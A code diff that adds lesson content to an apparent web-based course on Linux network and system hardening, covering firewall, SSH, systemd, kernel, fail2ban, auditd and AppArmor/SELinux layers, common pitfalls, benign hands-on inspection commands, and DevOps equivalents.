+    │  │  MAC (Mandatory Access Control)                         │   │
+    │  │                                                          │   │
+    │  │  ┌─────────────────────────────────────────────────┐    │   │
+    │  │  │  Central security policy                       │    │   │
+    │  │  └────────────────────┬────────────────────────────┘    │   │
+    │  │                       │                                  │   │
+    │  │                       ▼                                  │   │
+    │  │  ┌─────────────────────────────────────────────────┐    │   │
+    │  │  │  enforced system-wide                         │    │   │
+    │  │  └────────────────────┬────────────────────────────┘    │   │
+    │  │                       │                                  │   │
+    │  │                       ▼                                  │   │
+    │  │  ┌─────────────────────────────────────────────────┐    │   │
+    │  │  │  Even root/owner CANNOT override the policy    │    │   │
+    │  │  │  directly                                     │    │   │
+    │  │  └─────────────────────────────────────────────────┘    │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+      `
+    },
+    {
+      id: 's9-layers-reference',
+      title: '9.11 Hardening Layers — Quick Reference',
+      priority: false,
+      icon: '📊',
+      bodyHTML: `
+        <div class="table-wrapper">
+          <table class="data-table">
+            <thead><tr><th>Layer</th><th>What it protects</th><th>Example</th></tr></thead>
+            <tbody>
+              <tr><td><strong>Firewall</strong></td><td>Network access</td><td><code>ufw default deny incoming</code></td></tr>
+              <tr><td><strong>SSH hardening</strong></td><td>Remote access</td><td><code>PermitRootLogin no</code></td></tr>
+              <tr><td><strong>Service management</strong></td><td>Unnecessary attack surface</td><td><code>systemctl disable &lt;service&gt;</code></td></tr>
+              <tr><td><strong>Systemd hardening</strong></td><td>Process-level sandboxing</td><td><code>ProtectSystem=strict</code></td></tr>
+              <tr><td><strong>Kernel hardening</strong></td><td>Memory corruption exploits</td><td>ASLR, NX bit, <code>sysctl</code></td></tr>
+              <tr><td><strong>Fail2ban</strong></td><td>Brute-force attacks</td><td>Rate-limiting login attempts</td></tr>
+              <tr><td><strong>Auditd</strong></td><td>System logging</td><td>Monitoring <code>/etc/shadow</code></td></tr>
+              <tr><td><strong>MAC (AppArmor/SELinux)</strong></td><td>Program confinement</td><td>AppArmor profile per service</td></tr>
+              <tr><td><strong>CIS Benchmarks</strong></td><td>Compliance baseline</td><td>Automated scanning</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Hardening Maturity Levels</h4>
+        <div class="table-wrapper">
+          <table class="data-table">
+            <thead><tr><th>Level</th><th>Description</th><th>Who needs it</th></tr></thead>
+            <tbody>
+              <tr><td><strong>Basic</strong></td><td>Firewall default-deny, SSH key auth, remove default creds</td><td>Everyone — minimum baseline</td></tr>
+              <tr><td><strong>Standard</strong></td><td>All of the above + systemd hardening, fail2ban, patching</td><td>Most production systems</td></tr>
+              <tr><td><strong>Advanced</strong></td><td>All of the above + kernel hardening, auditd, MAC, CIS compliance</td><td>High-security environments, regulated industries</td></tr>
+            </tbody>
+          </table>
+        </div>
+      `
+    },
+    {
+      id: 's9-pitfalls',
+      title: '9.12 Common Pitfalls',
+      priority: false,
+      icon: '⚠️',
+      bodyHTML: `
+        <div class="table-wrapper">
+          <table class="data-table">
+            <thead><tr><th>Pitfall</th><th>Why it happens</th><th>How to avoid</th></tr></thead>
+            <tbody>
+              <tr><td><strong>Leaving default credentials unchanged</strong></td><td>Convenience, forgetting during initial setup</td><td>Change every default credential immediately on first boot</td></tr>
+              <tr><td><strong>Password-based SSH left enabled</strong></td><td>Perceived convenience over key-based auth</td><td>Disable password auth; add fail2ban as compensating control if necessary</td></tr>
+              <tr><td><strong>Databases/internal services exposed to 0.0.0.0</strong></td><td>Assuming "it's just for internal use" is sufficient</td><td>Explicitly bind to internal interfaces and firewall accordingly</td></tr>
+              <tr><td><strong>Running services as root unnecessarily</strong></td><td>Simplicity during initial setup</td><td>Create dedicated, unprivileged users per service</td></tr>
+              <tr><td><strong>"We'll patch it later"</strong></td><td>Patching feels disruptive</td><td>Automate patching where possible</td></tr>
+              <tr><td><strong>No port scanning of your own infrastructure</strong></td><td>Assuming you already know what's open</td><td>Periodically scan your own systems</td></tr>
+              <tr><td><strong>Assuming DAC permissions alone are "enough"</strong></td><td>Not distinguishing DAC from MAC</td><td>Layer AppArmor/SELinux for genuine defence-in-depth</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Real-World Examples</h4>
+        <ul style="padding-left:1.2rem;margin:0.25rem 0 0.5rem 0;">
+          <li><strong>Mirai botnet (2016):</strong> compromised an estimated 600,000+ IoT devices purely by scanning the internet and logging in with unchanged factory-default credentials — no sophisticated exploit needed.</li>
+          <li><strong>MongoDB ransom attacks (2017 and recurring since):</strong> tens of thousands of MongoDB databases were found completely exposed to the public internet with no authentication configured — a pure port-hygiene failure.</li>
+          <li><strong>Shodan:</strong> a search engine that indexes exposed infrastructure across the internet — illustrating how much unhardened infrastructure is sitting exposed at any given moment.</li>
+        </ul>
+      `
+    },
+    {
+      id: 's9-hands-on',
+      title: '9.13 Hands-On Practice (Codespace)',
+      priority: false,
+      icon: '🖥️',
+      bodyHTML: `
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0 0 0.25rem 0;">1. Check what ports are actively listening</h4>
+        <div class="code-block">
+          <pre>sudo ss -tulnp</pre>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">2. Simulate a basic port scan against localhost</h4>
+        <div class="code-block">
+          <pre>
+    sudo apt-get install -y nmap 2>/dev/null
+    nmap localhost</pre>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">3. Inspect SSH configuration for hardening opportunities</h4>
+        <div class="code-block">
+          <pre>sudo cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|PasswordAuthentication"</pre>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">4. List all running services</h4>
+        <div class="code-block">
+          <pre>systemctl list-units --type=service --state=running</pre>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">5. Check current kernel hardening-relevant sysctl values</h4>
+        <div class="code-block">
+          <pre>
+    sysctl kernel.randomize_va_space   # ASLR status: 2 = fully enabled
+    sysctl net.ipv4.conf.all.rp_filter # reverse path filtering</pre>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">6. Install and inspect fail2ban</h4>
+        <div class="code-block">
+          <pre>
+    sudo apt-get install -y fail2ban 2>/dev/null
+    sudo systemctl status fail2ban
+    sudo fail2ban-client status sshd</pre>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">7. Check if auditd is available and inspect example rules</h4>
+        <div class="code-block">
+          <pre>
+    sudo apt-get install -y auditd 2>/dev/null
+    sudo auditctl -l</pre>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">8. Check AppArmor status and loaded profiles</h4>
+        <div class="code-block">
+          <pre>sudo aa-status</pre>
+        </div>
+      `
+    },
+    {
+      id: 's9-devops-connection',
+      title: '9.14 DevOps Connection (Expanded)',
+      priority: false,
+      icon: '⚙️',
+      bodyHTML: `
+        <div class="table-wrapper">
+          <table class="data-table">
+            <thead><tr><th>DevOps context</th><th>Where hardening appears</th></tr></thead>
+            <tbody>
+              <tr><td><strong>Security Groups (AWS) / Network Policies (Kubernetes)</strong></td><td>The cloud-native equivalent of default-deny firewalls</td></tr>
+              <tr><td><strong>CIS Benchmarks + OpenSCAP / CSPM tools</strong></td><td>Automated compliance scanning; CSPM tools continuously check cloud configuration</td></tr>
+              <tr><td><strong>Immutable infrastructure</strong></td><td>Rebuild from hardened, versioned base images — reduces configuration drift</td></tr>
+              <tr><td><strong>Container image scanning (Trivy, Grype)</strong></td><td>Flags unnecessary packages and known vulnerabilities before deployment</td></tr>
+              <tr><td><strong>Bastion hosts / jump boxes</strong></td><td>A single, tightly hardened entry point for SSH access</td></tr>
+              <tr><td><strong>Automated patch management (AWS Systems Manager, Ansible)</strong></td><td>Scheduled, automated, auditable patching</td></tr>
+              <tr><td><strong>Kubernetes SecurityContext / PodSecurityStandards</strong></td><td>The container-orchestration equivalent of systemd hardening</td></tr>
+              <tr><td><strong>seccomp / AppArmor profiles in Docker/Kubernetes</strong></td><td>MAC concepts applied directly to containers</td></tr>
+              <tr><td><strong>Centralized audit log aggregation (CloudTrail, GuardDuty, ELK)</strong></td><td>The cloud-scale equivalent of auditd</td></tr>
+            </tbody>
+          </table>
+        </div>
+      `
+    },
+    {
+      id: 's9-key-takeaways',
+      title: 'Key Takeaways — Network & System Hardening',
+      priority: false,
+      icon: '🧠',
+      bodyHTML: `
+        <div class="mental-model-grid">
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">🛡️</span><span class="mental-title">Hardening is Deliberate</span></div>
+            <div class="mental-card-body">Reducing attack surface — disabling what isn't needed, restricting what remains, configuring actively rather than relying on defaults.</div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">🔥</span><span class="mental-title">Default-Deny</span></div>
+            <div class="mental-card-body">Block everything, explicitly allow only what's needed. The foundational firewall principle.</div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">📋</span><span class="mental-title">CIS Benchmarks</span></div>
+            <div class="mental-card-body">Vetted, numbered, auditable hardening checklists. Turns judgment calls into scorable items.</div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">⚙️</span><span class="mental-title">Systemd Hardening</span></div>
+            <div class="mental-card-body"><code>ProtectSystem</code>, <code>PrivateTmp</code>, <code>NoNewPrivileges</code> — sandbox services at the OS level.</div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">🧠</span><span class="mental-title">Kernel Hardening</span></div>
+            <div class="mental-card-body">ASLR, NX bit, sysctl tuning — makes memory-corruption exploits significantly harder.</div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">🚫</span><span class="mental-title">Fail2ban</span></div>
+            <div class="mental-card-body">Rate-limits brute-force login attempts — a practical, low-effort defence.</div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">📝</span><span class="mental-title">Auditd</span></div>
+            <div class="mental-card-body">OS-wide, tamper-evident logging of security-relevant events — essential for incident response.</div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">🔒</span><span class="mental-title">MAC (AppArmor/SELinux)</span></div>
+            <div class="mental-card-body">Constrains what a program can do even if compromised — a genuinely distinct layer from DAC permissions.</div>
+          </div>
+          <div class="mental-card mental-card-full">
+            <div class="mental-card-header"><span class="mental-icon">📊</span><span class="mental-title">Hardening is Layered</span></div>
+            <div class="mental-card-body">Firewall → SSH → services → systemd → kernel → fail2ban → auditd → MAC. Each layer addresses a different attack vector. No single layer is sufficient.</div>
+          </div>
+        </div>
+      `
+    }
+  ];
+
   // ============================================================
   // RENDER FUNCTIONS
   // ============================================================
@@ -3766,7 +4909,8 @@ document.addEventListener('DOMContentLoaded', () => {
   renderAccordion('js-section5-container', SECTION_5_ACCORDIONS);
   renderAccordion('js-section6-container', SECTION_6_ACCORDIONS);
   renderAccordion('js-section7-container', SECTION_7_ACCORDIONS);
-  
+  renderAccordion('js-section8-container', SECTION_8_ACCORDIONS);
+  renderAccordion('js-section9-container', SECTION_9_ACCORDIONS)
   // Sections 4-9 are currently placeholders — they will have content added later
   // ============================================================
   // FLOATING PROGRESS RING
